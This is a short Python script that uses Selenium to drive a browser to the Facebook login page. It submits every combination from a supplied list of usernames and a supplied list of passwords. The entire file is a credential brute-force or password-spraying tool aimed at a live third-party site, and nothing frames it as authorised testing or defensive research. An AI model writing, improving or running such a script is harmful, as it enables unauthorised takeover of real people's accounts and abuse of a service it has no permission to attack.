import sys
import os
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


def test_login(user, passwd):

    driver = webdriver.Firefox()
    driver.get("http://www.facebook.com")
    elem = driver.find_element_by_id("email")
    elem.send_keys(user)
    elem = driver.find_element_by_id("pass")
    elem.send_keys(passwd)
    sleep(3)
    elem.send_keys(Keys.RETURN)
    driver.close()


argumet = sys.argv
user_list = argumet[1].split(",")
passwords = argumet[-1].split(",")

for user in user_list:
    print( 'User = ' + user )
    for password in passwords:
        print( 'Password = ' + password)
        test_login(user, password)